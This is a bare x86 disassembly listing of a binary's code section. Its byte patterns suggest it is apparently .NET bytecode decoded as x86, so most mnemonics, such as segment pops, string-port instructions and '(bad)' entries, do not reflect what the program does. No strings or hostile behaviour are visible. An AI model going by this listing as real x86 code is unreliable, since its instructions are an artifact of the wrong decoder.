  40522f:	7e 0d                	jle    0x40523e
  405231:	00 00                	add    %al,(%eax)
  405233:	04 28                	add    $0x28,%al
  405235:	1f                   	pop    %ds
  405236:	00 00                	add    %al,(%eax)
  405238:	0a 1c 28             	or     (%eax,%ebp,1),%bl
  40523b:	0a 01                	or     (%ecx),%al
  40523d:	00 0a                	add    %cl,(%edx)
  40523f:	1f                   	pop    %ds
  405240:	11 13                	adc    %edx,(%ebx)
  405242:	17                   	pop    %ss
  405243:	06                   	push   %es
  405244:	28 0b                	sub    %cl,(%ebx)
  405246:	01 00                	add    %eax,(%eax)
  405248:	0a 13                	or     (%ebx),%dl
  40524a:	0d 16 13 0c 38       	or     $0x380c1316,%eax
  40524f:	54                   	push   %esp
  405250:	03 00                	add    (%eax),%eax
  405252:	00 11                	add    %dl,(%ecx)
  405254:	0d 11 0c 9a 13       	or     $0x139a0c11,%eax
  405259:	04 1f                	add    $0x1f,%al
  40525b:	12 13                	adc    (%ebx),%dl
  40525d:	17                   	pop    %ss
  40525e:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  405261:	0c 01                	or     $0x1,%al
  405263:	00 0a                	add    %cl,(%edx)
  405265:	6f                   	outsl  %ds:(%esi),(%dx)
  405266:	56                   	push   %esi
  405267:	00 00                	add    %al,(%eax)
  405269:	0a 72 f7             	or     -0x9(%edx),%dh
  40526c:	02 00                	add    (%eax),%al
  40526e:	70 16                	jo     0x405286
  405270:	28 5b 00             	sub    %bl,0x0(%ebx)
  405273:	00 0a                	add    %cl,(%edx)
  405275:	16                   	push   %ss
  405276:	fe 01                	incb   (%ecx)
  405278:	16                   	push   %ss
  405279:	fe 01                	incb   (%ecx)
  40527b:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  40527e:	56                   	push   %esi
  40527f:	00 00                	add    %al,(%eax)
  405281:	0a 06                	or     (%esi),%al
  405283:	6f                   	outsl  %ds:(%esi),(%dx)
  405284:	56                   	push   %esi
  405285:	00 00                	add    %al,(%eax)
  405287:	0a 7e 0d             	or     0xd(%esi),%bh
  40528a:	00 00                	add    %al,(%eax)
  40528c:	04 6f                	add    $0x6f,%al
  40528e:	56                   	push   %esi
  40528f:	00 00                	add    %al,(%eax)
  405291:	0a 28                	or     (%eax),%ch
  405293:	1f                   	pop    %ds
  405294:	00 00                	add    %al,(%eax)
  405296:	0a 16                	or     (%esi),%dl
  405298:	28 5b 00             	sub    %bl,0x0(%ebx)
  40529b:	00 0a                	add    %cl,(%edx)
  40529d:	16                   	push   %ss
  40529e:	fe 01                	incb   (%ecx)
  4052a0:	16                   	push   %ss
  4052a1:	fe 01                	incb   (%ecx)
  4052a3:	5f                   	pop    %edi
  4052a4:	39 f4                	cmp    %esi,%esp
  4052a6:	02 00                	add    (%eax),%al
  4052a8:	00 1f                	add    %bl,(%edi)
  4052aa:	13 13                	adc    (%ebx),%edx
  4052ac:	17                   	pop    %ss
  4052ad:	11 04 1c             	adc    %eax,(%esp,%ebx,1)
  4052b0:	28 0a                	sub    %cl,(%edx)
  4052b2:	01 00                	add    %eax,(%eax)
  4052b4:	0a 1f                	or     (%edi),%bl
  4052b6:	14 13                	adc    $0x13,%al
  4052b8:	17                   	pop    %ss
  4052b9:	07                   	pop    %es
  4052ba:	14 72                	adc    $0x72,%al
  4052bc:	1f                   	pop    %ds
  4052bd:	03 00                	add    (%eax),%eax
  4052bf:	70 17                	jo     0x4052d8
  4052c1:	8d 03                	lea    (%ebx),%eax
  4052c3:	00 00                	add    %al,(%eax)
  4052c5:	01 13                	add    %edx,(%ebx)
  4052c7:	0e                   	push   %cs
  4052c8:	11 0e                	adc    %ecx,(%esi)
  4052ca:	16                   	push   %ss
  4052cb:	06                   	push   %es
  4052cc:	11 04 73             	adc    %eax,(%ebx,%esi,2)
  4052cf:	29 00                	sub    %eax,(%eax)
  4052d1:	00 0a                	add    %cl,(%edx)
  4052d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4052d4:	0d 01 00 0a 72       	or     $0x720a0001,%eax
  4052d9:	f7 02 00 70 28 28    	testl  $0x28287000,(%edx)
  4052df:	00 00                	add    %al,(%eax)
  4052e1:	0a a2 11 0e 14 14    	or     0x14140e11(%edx),%ah
  4052e7:	14 28                	adc    $0x28,%al
  4052e9:	41                   	inc    %ecx
  4052ea:	00 00                	add    %al,(%eax)
  4052ec:	0a 13                	or     (%ebx),%dl
  4052ee:	0f 1f 15 13 17 11 0f 	nopl   0xf111713
  4052f5:	14 72                	adc    $0x72,%al
  4052f7:	88 0e                	mov    %cl,(%esi)
  4052f9:	00 70 17             	add    %dh,0x17(%eax)
  4052fc:	8d 03                	lea    (%ebx),%eax
  4052fe:	00 00                	add    %al,(%eax)
  405300:	01 13                	add    %edx,(%ebx)
  405302:	10 11                	adc    %dl,(%ecx)
  405304:	10 16                	adc    %dl,(%esi)
  405306:	1d 8c 7d 00 00       	sbb    $0x7d8c,%eax
  40530b:	01 a2 11 10 14 14    	add    %esp,0x14141011(%edx)
  405311:	16                   	push   %ss
  405312:	17                   	pop    %ss
  405313:	28 43 00             	sub    %al,0x0(%ebx)
  405316:	00 0a                	add    %cl,(%edx)
  405318:	1f                   	pop    %ds
  405319:	16                   	push   %ss
  40531a:	13 17                	adc    (%edi),%edx
  40531c:	11 0f                	adc    %ecx,(%edi)
  40531e:	14 72                	adc    $0x72,%al
  405320:	3d 03 00 70 17       	cmp    $0x17700003,%eax
  405325:	8d 03                	lea    (%ebx),%eax
  405327:	00 00                	add    %al,(%eax)
  405329:	01 13                	add    %edx,(%ebx)
  40532b:	10 11                	adc    %dl,(%ecx)
  40532d:	10 16                	adc    %dl,(%esi)
  40532f:	72 a0                	jb     0x4052d1
  405331:	0e                   	push   %cs
  405332:	00 70 a2             	add    %dh,-0x5e(%eax)
  405335:	11 10                	adc    %edx,(%eax)
  405337:	14 14                	adc    $0x14,%al
  405339:	16                   	push   %ss
  40533a:	17                   	pop    %ss
  40533b:	28 43 00             	sub    %al,0x0(%ebx)
  40533e:	00 0a                	add    %cl,(%edx)
  405340:	1f                   	pop    %ds
  405341:	17                   	pop    %ss
  405342:	13 17                	adc    (%edi),%edx
  405344:	11 0f                	adc    %ecx,(%edi)
  405346:	14 72                	adc    $0x72,%al
  405348:	53                   	push   %ebx
  405349:	03 00                	add    (%eax),%eax
  40534b:	70 17                	jo     0x405364
  40534d:	8d 03                	lea    (%ebx),%eax
  40534f:	00 00                	add    %al,(%eax)
  405351:	01 13                	add    %edx,(%ebx)
  405353:	10 11                	adc    %dl,(%ecx)
  405355:	10 16                	adc    %dl,(%esi)
  405357:	72 1d                	jb     0x405376
  405359:	03 00                	add    (%eax),%eax
  40535b:	70 a2                	jo     0x4052ff
  40535d:	11 10                	adc    %edx,(%eax)
  40535f:	14 14                	adc    $0x14,%al
  405361:	16                   	push   %ss
  405362:	17                   	pop    %ss
  405363:	28 43 00             	sub    %al,0x0(%ebx)
  405366:	00 0a                	add    %cl,(%edx)
  405368:	1f                   	pop    %ds
  405369:	18 13                	sbb    %dl,(%ebx)
  40536b:	17                   	pop    %ss
  40536c:	11 0f                	adc    %ecx,(%edi)
  40536e:	14 72                	adc    $0x72,%al
  405370:	b0 0e                	mov    $0xe,%al
  405372:	00 70 17             	add    %dh,0x17(%eax)
  405375:	8d 03                	lea    (%ebx),%eax
  405377:	00 00                	add    %al,(%eax)
  405379:	01 13                	add    %edx,(%ebx)
  40537b:	10 11                	adc    %dl,(%ecx)
  40537d:	10 16                	adc    %dl,(%esi)
  40537f:	1b 8d 26 00 00 01    	sbb    0x1000026(%ebp),%ecx
  405385:	13 11                	adc    (%ecx),%edx
  405387:	11 11                	adc    %edx,(%ecx)
  405389:	16                   	push   %ss
  40538a:	72 c4                	jb     0x405350
  40538c:	0e                   	push   %cs
  40538d:	00 70 a2             	add    %dh,-0x5e(%eax)
  405390:	11 11                	adc    %edx,(%ecx)
  405392:	17                   	pop    %ss
  405393:	7e 0d                	jle    0x4053a2
  405395:	00 00                	add    %al,(%eax)
  405397:	04 72                	add    $0x72,%al
  405399:	17                   	pop    %ss
  40539a:	06                   	push   %es
  40539b:	00 70 72             	add    %dh,0x72(%eax)
  40539e:	d8 0e                	fmuls  (%esi)
  4053a0:	00 70 6f             	add    %dh,0x6f(%eax)
  4053a3:	76 00                	jbe    0x4053a5
  4053a5:	00 0a                	add    %cl,(%edx)
  4053a7:	a2 11 11 18 72       	mov    %al,0x72181111
  4053ac:	e0 0e                	loopne 0x4053bc
  4053ae:	00 70 a2             	add    %dh,-0x5e(%eax)
  4053b1:	11 11                	adc    %edx,(%ecx)
  4053b3:	19 11                	sbb    %edx,(%ecx)
  4053b5:	04 73                	add    $0x73,%al
  4053b7:	29 00                	sub    %eax,(%eax)
  4053b9:	00 0a                	add    %cl,(%edx)
  4053bb:	6f                   	outsl  %ds:(%esi),(%dx)
  4053bc:	0d 01 00 0a 72       	or     $0x720a0001,%eax
  4053c1:	17                   	pop    %ss
  4053c2:	06                   	push   %es
  4053c3:	00 70 72             	add    %dh,0x72(%eax)
  4053c6:	d8 0e                	fmuls  (%esi)
  4053c8:	00 70 6f             	add    %dh,0x6f(%eax)
  4053cb:	76 00                	jbe    0x4053cd
  4053cd:	00 0a                	add    %cl,(%edx)
  4053cf:	a2 11 11 1a 72       	mov    %al,0x721a1111
  4053d4:	f0 0e                	lock push %cs
  4053d6:	00 70 a2             	add    %dh,-0x5e(%eax)
  4053d9:	11 11                	adc    %edx,(%ecx)
  4053db:	28 36                	sub    %dh,(%esi)
  4053dd:	00 00                	add    %al,(%eax)
  4053df:	0a a2 11 10 14 14    	or     0x14141011(%edx),%ah
  4053e5:	16                   	push   %ss
  4053e6:	17                   	pop    %ss
  4053e7:	28 43 00             	sub    %al,0x0(%ebx)
  4053ea:	00 0a                	add    %cl,(%edx)
  4053ec:	1f                   	pop    %ds
  4053ed:	19 13                	sbb    %edx,(%ebx)
  4053ef:	17                   	pop    %ss
  4053f0:	07                   	pop    %es
  4053f1:	14 72                	adc    $0x72,%al
  4053f3:	00 0f                	add    %cl,(%edi)
  4053f5:	00 70 17             	add    %dh,0x17(%eax)
  4053f8:	8d 03                	lea    (%ebx),%eax
  4053fa:	00 00                	add    %al,(%eax)
  4053fc:	01 13                	add    %edx,(%ebx)
  4053fe:	0e                   	push   %cs
  4053ff:	11 0e                	adc    %ecx,(%esi)
  405401:	16                   	push   %ss
  405402:	72 10                	jb     0x405414
  405404:	0f 00                	(bad)
  405406:	70 07                	jo     0x40540f
  405408:	14 72                	adc    $0x72,%al
  40540a:	00 0f                	add    %cl,(%edi)
  40540c:	00 70 17             	add    %dh,0x17(%eax)
  40540f:	8d 03                	lea    (%ebx),%eax
  405411:	00 00                	add    %al,(%eax)
  405413:	01 13                	add    %edx,(%ebx)
  405415:	10 11                	adc    %dl,(%ecx)
  405417:	10 16                	adc    %dl,(%esi)
  405419:	72 5a                	jb     0x405475
  40541b:	0f 00                	(bad)
  40541d:	70 11                	jo     0x405430
  40541f:	04 28                	add    $0x28,%al
  405421:	4f                   	dec    %edi
  405422:	00 00                	add    %al,(%eax)
  405424:	0a 72 a6             	or     -0x5a(%edx),%dh
  405427:	0f 00                	(bad)
  405429:	70 15                	jo     0x405440
  40542b:	16                   	push   %ss
  40542c:	28 af 00 00 0a 11    	sub    %ch,0x110a0000(%edi)
  405432:	04 28                	add    $0x28,%al
  405434:	4f                   	dec    %edi
  405435:	00 00                	add    %al,(%eax)
  405437:	0a 72 a6             	or     -0x5a(%edx),%dh
  40543a:	0f 00                	(bad)
  40543c:	70 15                	jo     0x405453
  40543e:	16                   	push   %ss
  40543f:	28 af 00 00 0a 17    	sub    %ch,0x170a0000(%edi)
  405445:	28 0e                	sub    %cl,(%esi)
  405447:	01 00                	add    %eax,(%eax)
  405449:	0a 9a 72 c9 01 00    	or     0x1c972(%edx),%bl
  40544f:	70 28                	jo     0x405479
  405451:	28 00                	sub    %al,(%eax)
  405453:	00 0a                	add    %cl,(%edx)
  405455:	a2 11 10 14 14       	mov    %al,0x14141011
  40545a:	14 28                	adc    $0x28,%al
  40545c:	41                   	inc    %ecx
  40545d:	00 00                	add    %al,(%eax)
  40545f:	0a 28                	or     (%eax),%ch
  405461:	91                   	xchg   %eax,%ecx
  405462:	00 00                	add    %al,(%eax)
  405464:	0a 72 aa             	or     -0x56(%edx),%dh
  405467:	0f 00                	(bad)
  405469:	70 28                	jo     0x405493
  40546b:	91                   	xchg   %eax,%ecx
  40546c:	00 00                	add    %al,(%eax)
  40546e:	0a a2 11 0e 14 14    	or     0x14140e11(%edx),%ah
  405474:	14 28                	adc    $0x28,%al
  405476:	41                   	inc    %ecx
  405477:	00 00                	add    %al,(%eax)
  405479:	0a 28                	or     (%eax),%ch
  40547b:	11 00                	adc    %eax,(%eax)
  40547d:	00 0a                	add    %cl,(%edx)
  40547f:	13 06                	adc    (%esi),%eax
  405481:	1f                   	pop    %ds
  405482:	1a 13                	sbb    (%ebx),%dl
  405484:	17                   	pop    %ss
  405485:	07                   	pop    %es
  405486:	14 72                	adc    $0x72,%al
  405488:	1f                   	pop    %ds
  405489:	03 00                	add    (%eax),%eax
  40548b:	70 17                	jo     0x4054a4
  40548d:	8d 03                	lea    (%ebx),%eax
  40548f:	00 00                	add    %al,(%eax)
  405491:	01 13                	add    %edx,(%ebx)
  405493:	10 11                	adc    %dl,(%ecx)
  405495:	10 16                	adc    %dl,(%esi)
  405497:	06                   	push   %es
  405498:	11 04 73             	adc    %eax,(%ebx,%esi,2)
  40549b:	29 00                	sub    %eax,(%eax)
  40549d:	00 0a                	add    %cl,(%edx)
  40549f:	6f                   	outsl  %ds:(%esi),(%dx)
  4054a0:	0d 01 00 0a 72       	or     $0x720a0001,%eax
  4054a5:	f7 02 00 70 28 28    	testl  $0x28287000,(%edx)
  4054ab:	00 00                	add    %al,(%eax)
  4054ad:	0a a2 11 10 14 14    	or     0x14141011(%edx),%ah
  4054b3:	14 28                	adc    $0x28,%al
  4054b5:	41                   	inc    %ecx
  4054b6:	00 00                	add    %al,(%eax)
  4054b8:	0a 14 72             	or     (%edx,%esi,2),%dl
  4054bb:	c6                   	(bad)
  4054bc:	0f 00                	(bad)
  4054be:	70 16                	jo     0x4054d6
  4054c0:	8d 03                	lea    (%ebx),%eax
  4054c2:	00 00                	add    %al,(%eax)
  4054c4:	01 14 14             	add    %edx,(%esp,%edx,1)
  4054c7:	14 28                	adc    $0x28,%al
  4054c9:	41                   	inc    %ecx
  4054ca:	00 00                	add    %al,(%eax)
  4054cc:	0a 28                	or     (%eax),%ch
  4054ce:	11 00                	adc    %eax,(%eax)
  4054d0:	00 0a                	add    %cl,(%edx)
  4054d2:	13 05 1f 1b 13 17    	adc    0x17131b1f,%eax
  4054d8:	11 06                	adc    %eax,(%esi)
  4054da:	28 23                	sub    %ah,(%ebx)
  4054dc:	00 00                	add    %al,(%eax)
  4054de:	0a 72 f1             	or     -0xf(%edx),%dh
  4054e1:	06                   	push   %es
  4054e2:	00 70 16             	add    %dh,0x16(%eax)
  4054e5:	28 0f                	sub    %cl,(%edi)
  4054e7:	01 00                	add    %eax,(%eax)
  4054e9:	0a 16                	or     (%esi),%dl
  4054eb:	33 27                	xor    (%edi),%esp
  4054ed:	1f                   	pop    %ds
  4054ee:	1c 13                	sbb    $0x13,%al
  4054f0:	17                   	pop    %ss
  4054f1:	11 0f                	adc    %ecx,(%edi)
  4054f3:	14 72                	adc    $0x72,%al
  4054f5:	e0 0f                	loopne 0x405506
  4054f7:	00 70 17             	add    %dh,0x17(%eax)
  4054fa:	8d 03                	lea    (%ebx),%eax
  4054fc:	00 00                	add    %al,(%eax)
  4054fe:	01 13                	add    %edx,(%ebx)
  405500:	10 11                	adc    %dl,(%ecx)
  405502:	10 16                	adc    %dl,(%esi)
  405504:	11 04 a2             	adc    %eax,(%edx,%eiz,4)
  405507:	11 10                	adc    %edx,(%eax)
  405509:	14 14                	adc    $0x14,%al
  40550b:	16                   	push   %ss
  40550c:	17                   	pop    %ss
  40550d:	28 43 00             	sub    %al,0x0(%ebx)
  405510:	00 0a                	add    %cl,(%edx)
  405512:	2b 2e                	sub    (%esi),%ebp
  405514:	1f                   	pop    %ds
  405515:	1e                   	push   %ds
  405516:	13 17                	adc    (%edi),%edx
  405518:	1f                   	pop    %ds
  405519:	1f                   	pop    %ds
  40551a:	13 17                	adc    (%edi),%edx
  40551c:	11 0f                	adc    %ecx,(%edi)
  40551e:	14 72                	adc    $0x72,%al
  405520:	e0 0f                	loopne 0x405531
  405522:	00 70 17             	add    %dh,0x17(%eax)
  405525:	8d 03                	lea    (%ebx),%eax
  405527:	00 00                	add    %al,(%eax)
  405529:	01 13                	add    %edx,(%ebx)
  40552b:	10 11                	adc    %dl,(%ecx)
  40552d:	10 16                	adc    %dl,(%esi)
  40552f:	11 06                	adc    %eax,(%esi)
  405531:	28 11                	sub    %dl,(%ecx)
  405533:	00 00                	add    %al,(%eax)
  405535:	0a a2 11 10 14 14    	or     0x14141011(%edx),%ah
  40553b:	16                   	push   %ss
  40553c:	17                   	pop    %ss
  40553d:	28 43 00             	sub    %al,0x0(%ebx)
  405540:	00 0a                	add    %cl,(%edx)
  405542:	1f                   	pop    %ds
  405543:	21 13                	and    %edx,(%ebx)
  405545:	17                   	pop    %ss
  405546:	11 0f                	adc    %ecx,(%edi)
  405548:	14 72                	adc    $0x72,%al
  40554a:	e0 0f                	loopne 0x40555b
  40554c:	00 70 16             	add    %dh,0x16(%eax)
  40554f:	8d 03                	lea    (%ebx),%eax
  405551:	00 00                	add    %al,(%eax)
  405553:	01 14 14             	add    %edx,(%esp,%edx,1)
  405556:	14 28                	adc    $0x28,%al
  405558:	41                   	inc    %ecx
  405559:	00 00                	add    %al,(%eax)
  40555b:	0a 11                	or     (%ecx),%dl
  40555d:	05 16 28 10 01       	add    $0x1102816,%eax
  405562:	00 0a                	add    %cl,(%edx)
  405564:	28 11                	sub    %dl,(%ecx)
  405566:	01 00                	add    %eax,(%eax)
  405568:	0a 28                	or     (%eax),%ch
  40556a:	12 01                	adc    (%ecx),%al
  40556c:	00 0a                	add    %cl,(%edx)
  40556e:	2c 1c                	sub    $0x1c,%al
  405570:	1f                   	pop    %ds
  405571:	22 13                	and    (%ebx),%dl
  405573:	17                   	pop    %ss
  405574:	11 0f                	adc    %ecx,(%edi)
  405576:	14 72                	adc    $0x72,%al
  405578:	75 03                	jne    0x40557d
  40557a:	00 70 16             	add    %dh,0x16(%eax)
  40557d:	8d 03                	lea    (%ebx),%eax
  40557f:	00 00                	add    %al,(%eax)
  405581:	01 14 14             	add    %edx,(%esp,%edx,1)
  405584:	14 17                	adc    $0x17,%al
  405586:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  40558a:	0a 26                	or     (%esi),%ah
  40558c:	1f                   	pop    %ds
  40558d:	24 13                	and    $0x13,%al
  40558f:	17                   	pop    %ss
  405590:	14 13                	adc    $0x13,%al
  405592:	05 1f 25 13 17       	add    $0x1713251f,%eax
  405597:	14 13                	adc    $0x13,%al
  405599:	06                   	push   %es
  40559a:	14 13                	adc    $0x13,%al
  40559c:	0f 11 0c 17          	movups %xmm1,(%edi,%edx,1)
  4055a0:	d6                   	salc
  4055a1:	13 0c 1f             	adc    (%edi,%ebx,1),%ecx
  4055a4:	28 13                	sub    %dl,(%ebx)
  4055a6:	17                   	pop    %ss
  4055a7:	11 0c 11             	adc    %ecx,(%ecx,%edx,1)
  4055aa:	0d 8e b7 3f a1       	or     $0xa13fb78e,%eax
  4055af:	fc                   	cld
  4055b0:	ff                   	(bad)
  4055b1:	ff 1f                	lcall  *(%edi)
  4055b3:	29 13                	sub    %edx,(%ebx)
  4055b5:	17                   	pop    %ss
  4055b6:	06                   	push   %es
  4055b7:	28 13                	sub    %dl,(%ebx)
  4055b9:	01 00                	add    %eax,(%eax)
  4055bb:	0a 13                	or     (%ebx),%dl
  4055bd:	13 16                	adc    (%esi),%edx
  4055bf:	13 12                	adc    (%edx),%edx
  4055c1:	38 99 02 00 00 11    	cmp    %bl,0x11000002(%ecx)
  4055c7:	13 11                	adc    (%ecx),%edx
  4055c9:	12 9a 13 07 1f 2a    	adc    0x2a1f0713(%edx),%bl
  4055cf:	13 17                	adc    (%edi),%edx
  4055d1:	11 07                	adc    %eax,(%edi)
  4055d3:	1c 28                	sbb    $0x28,%al
  4055d5:	0a 01                	or     (%ecx),%al
  4055d7:	00 0a                	add    %cl,(%edx)
  4055d9:	1f                   	pop    %ds
  4055da:	2b 13                	sub    (%ebx),%edx
  4055dc:	17                   	pop    %ss
  4055dd:	07                   	pop    %es
  4055de:	14 72                	adc    $0x72,%al
  4055e0:	1f                   	pop    %ds
  4055e1:	03 00                	add    (%eax),%eax
  4055e3:	70 17                	jo     0x4055fc
  4055e5:	8d 03                	lea    (%ebx),%eax
  4055e7:	00 00                	add    %al,(%eax)
  4055e9:	01 13                	add    %edx,(%ebx)
  4055eb:	10 11                	adc    %dl,(%ecx)
  4055ed:	10 16                	adc    %dl,(%esi)
  4055ef:	06                   	push   %es
  4055f0:	11 07                	adc    %eax,(%edi)
  4055f2:	28 35 00 00 0a 72    	sub    %dh,0x720a0000
  4055f8:	fa                   	cli
  4055f9:	0f 00                	(bad)
  4055fb:	70 28                	jo     0x405625
  4055fd:	28 00                	sub    %al,(%eax)
  4055ff:	00 0a                	add    %cl,(%edx)
  405601:	a2 11 10 14 14       	mov    %al,0x14141011
  405606:	14 28                	adc    $0x28,%al
  405608:	41                   	inc    %ecx
  405609:	00 00                	add    %al,(%eax)
  40560b:	0a 13                	or     (%ebx),%dl
  40560d:	14 1f                	adc    $0x1f,%al
  40560f:	2c 13                	sub    $0x13,%al
  405611:	17                   	pop    %ss
  405612:	11 14 14             	adc    %edx,(%esp,%edx,1)
  405615:	72 88                	jb     0x40559f
  405617:	0e                   	push   %cs
  405618:	00 70 17             	add    %dh,0x17(%eax)
  40561b:	8d 03                	lea    (%ebx),%eax
  40561d:	00 00                	add    %al,(%eax)
  40561f:	01 13                	add    %edx,(%ebx)
  405621:	0e                   	push   %cs
  405622:	11 0e                	adc    %ecx,(%esi)
  405624:	16                   	push   %ss
  405625:	1d 8c 7d 00 00       	sbb    $0x7d8c,%eax
  40562a:	01 a2 11 0e 14 14    	add    %esp,0x14140e11(%edx)
  405630:	16                   	push   %ss
  405631:	17                   	pop    %ss
  405632:	28 43 00             	sub    %al,0x0(%ebx)
  405635:	00 0a                	add    %cl,(%edx)
  405637:	1f                   	pop    %ds
  405638:	2d 13 17 11 14       	sub    $0x14111713,%eax
  40563d:	14 72                	adc    $0x72,%al
  40563f:	3d 03 00 70 17       	cmp    $0x17700003,%eax
  405644:	8d 03                	lea    (%ebx),%eax
  405646:	00 00                	add    %al,(%eax)
  405648:	01 13                	add    %edx,(%ebx)
  40564a:	10 11                	adc    %dl,(%ecx)
  40564c:	10 16                	adc    %dl,(%esi)
  40564e:	72 a0                	jb     0x4055f0
  405650:	0e                   	push   %cs
  405651:	00 70 a2             	add    %dh,-0x5e(%eax)
  405654:	11 10                	adc    %edx,(%eax)
  405656:	14 14                	adc    $0x14,%al
  405658:	16                   	push   %ss
  405659:	17                   	pop    %ss
  40565a:	28 43 00             	sub    %al,0x0(%ebx)
  40565d:	00 0a                	add    %cl,(%edx)
  40565f:	1f                   	pop    %ds
  405660:	2e 13 17             	adc    %cs:(%edi),%edx
  405663:	11 14 14             	adc    %edx,(%esp,%edx,1)
  405666:	72 53                	jb     0x4056bb
  405668:	03 00                	add    (%eax),%eax
  40566a:	70 17                	jo     0x405683
  40566c:	8d 03                	lea    (%ebx),%eax
  40566e:	00 00                	add    %al,(%eax)
  405670:	01 13                	add    %edx,(%ebx)
  405672:	10 11                	adc    %dl,(%ecx)
  405674:	10 16                	adc    %dl,(%esi)
  405676:	72 1d                	jb     0x405695
  405678:	03 00                	add    (%eax),%eax
  40567a:	70 a2                	jo     0x40561e
  40567c:	11 10                	adc    %edx,(%eax)
  40567e:	14 14                	adc    $0x14,%al
  405680:	16                   	push   %ss
  405681:	17                   	pop    %ss
  405682:	28 43 00             	sub    %al,0x0(%ebx)
  405685:	00 0a                	add    %cl,(%edx)
  405687:	1f                   	pop    %ds
  405688:	2f                   	das
  405689:	13 17                	adc    (%edi),%edx
  40568b:	11 14 14             	adc    %edx,(%esp,%edx,1)
  40568e:	72 06                	jb     0x405696
  405690:	10 00                	adc    %al,(%eax)
  405692:	70 17                	jo     0x4056ab
  405694:	8d 03                	lea    (%ebx),%eax
  405696:	00 00                	add    %al,(%eax)
  405698:	01 13                	add    %edx,(%ebx)
  40569a:	10 11                	adc    %dl,(%ecx)
  40569c:	10 16                	adc    %dl,(%esi)
  40569e:	1b 8d 26 00 00 01    	sbb    0x1000026(%ebp),%ecx
  4056a4:	13 11                	adc    (%ecx),%edx
  4056a6:	11 11                	adc    %edx,(%ecx)
  4056a8:	16                   	push   %ss
  4056a9:	72 c4                	jb     0x40566f
  4056ab:	0e                   	push   %cs
  4056ac:	00 70 a2             	add    %dh,-0x5e(%eax)
  4056af:	11 11                	adc    %edx,(%ecx)
  4056b1:	17                   	pop    %ss
  4056b2:	7e 0d                	jle    0x4056c1
  4056b4:	00 00                	add    %al,(%eax)
  4056b6:	04 72                	add    $0x72,%al
  4056b8:	17                   	pop    %ss
  4056b9:	06                   	push   %es
  4056ba:	00 70 72             	add    %dh,0x72(%eax)
  4056bd:	d8 0e                	fmuls  (%esi)
  4056bf:	00 70 17             	add    %dh,0x17(%eax)
  4056c2:	15 16 28 14 01       	adc    $0x1142816,%eax
  4056c7:	00 0a                	add    %cl,(%edx)
  4056c9:	a2 11 11 18 72       	mov    %al,0x72181111
  4056ce:	1a 10                	sbb    (%eax),%dl
  4056d0:	00 70 a2             	add    %dh,-0x5e(%eax)
  4056d3:	11 11                	adc    %edx,(%ecx)
  4056d5:	19 11                	sbb    %edx,(%ecx)
  4056d7:	07                   	pop    %es
  4056d8:	73 15                	jae    0x4056ef
  4056da:	01 00                	add    %eax,(%eax)
  4056dc:	0a 6f 16             	or     0x16(%edi),%ch
  4056df:	01 00                	add    %eax,(%eax)
  4056e1:	0a 72 17             	or     0x17(%edx),%dh
  4056e4:	06                   	push   %es
  4056e5:	00 70 72             	add    %dh,0x72(%eax)
  4056e8:	d8 0e                	fmuls  (%esi)
  4056ea:	00 70 17             	add    %dh,0x17(%eax)
  4056ed:	15 16 28 14 01       	adc    $0x1142816,%eax
  4056f2:	00 0a                	add    %cl,(%edx)
  4056f4:	a2 11 11 1a 72       	mov    %al,0x721a1111
  4056f9:	3c 10                	cmp    $0x10,%al
  4056fb:	00 70 a2             	add    %dh,-0x5e(%eax)
  4056fe:	11 11                	adc    %edx,(%ecx)
  405700:	28 36                	sub    %dh,(%esi)
  405702:	00 00                	add    %al,(%eax)
  405704:	0a a2 11 10 14 14    	or     0x14141011(%edx),%ah
  40570a:	16                   	push   %ss
  40570b:	17                   	pop    %ss
  40570c:	28 43 00             	sub    %al,0x0(%ebx)
  40570f:	00 0a                	add    %cl,(%edx)
  405711:	1f                   	pop    %ds
  405712:	30 13                	xor    %dl,(%ebx)
  405714:	17                   	pop    %ss
  405715:	07                   	pop    %es
  405716:	14 72                	adc    $0x72,%al
  405718:	00 0f                	add    %cl,(%edi)
  40571a:	00 70 17             	add    %dh,0x17(%eax)
  40571d:	8d 03                	lea    (%ebx),%eax
  40571f:	00 00                	add    %al,(%eax)
  405721:	01 13                	add    %edx,(%ebx)
  405723:	10 11                	adc    %dl,(%ecx)
  405725:	10 16                	adc    %dl,(%esi)
  405727:	72 48                	jb     0x405771
  405729:	10 00                	adc    %al,(%eax)
  40572b:	70 a2                	jo     0x4056cf
  40572d:	11 10                	adc    %edx,(%eax)
  40572f:	14 14                	adc    $0x14,%al
  405731:	14 28                	adc    $0x28,%al
  405733:	41                   	inc    %ecx
  405734:	00 00                	add    %al,(%eax)
  405736:	0a 28                	or     (%eax),%ch
  405738:	11 00                	adc    %eax,(%eax)
  40573a:	00 0a                	add    %cl,(%edx)
  40573c:	13 09                	adc    (%ecx),%ecx
  40573e:	1f                   	pop    %ds
  40573f:	31 13                	xor    %edx,(%ebx)
  405741:	17                   	pop    %ss
  405742:	07                   	pop    %es
  405743:	14 72                	adc    $0x72,%al
  405745:	1f                   	pop    %ds
  405746:	03 00                	add    (%eax),%eax
  405748:	70 17                	jo     0x405761
  40574a:	8d 03                	lea    (%ebx),%eax
  40574c:	00 00                	add    %al,(%eax)
  40574e:	01 13                	add    %edx,(%ebx)
  405750:	10 11                	adc    %dl,(%ecx)
  405752:	10 16                	adc    %dl,(%esi)
  405754:	06                   	push   %es
  405755:	11 07                	adc    %eax,(%edi)
  405757:	28 35 00 00 0a 72    	sub    %dh,0x720a0000
  40575d:	fa                   	cli
  40575e:	0f 00                	(bad)
  405760:	70 28                	jo     0x40578a
  405762:	28 00                	sub    %al,(%eax)
  405764:	00 0a                	add    %cl,(%edx)
  405766:	a2 11 10 14 14       	mov    %al,0x14141011
  40576b:	14 28                	adc    $0x28,%al
  40576d:	41                   	inc    %ecx
  40576e:	00 00                	add    %al,(%eax)
  405770:	0a 14 72             	or     (%edx,%esi,2),%dl
  405773:	c6                   	(bad)
  405774:	0f 00                	(bad)
  405776:	70 16                	jo     0x40578e
  405778:	8d 03                	lea    (%ebx),%eax
  40577a:	00 00                	add    %al,(%eax)
  40577c:	01 14 14             	add    %edx,(%esp,%edx,1)
  40577f:	14 28                	adc    $0x28,%al
  405781:	41                   	inc    %ecx
  405782:	00 00                	add    %al,(%eax)
  405784:	0a 28                	or     (%eax),%ch
  405786:	11 00                	adc    %eax,(%eax)
  405788:	00 0a                	add    %cl,(%edx)
  40578a:	13 08                	adc    (%eax),%ecx
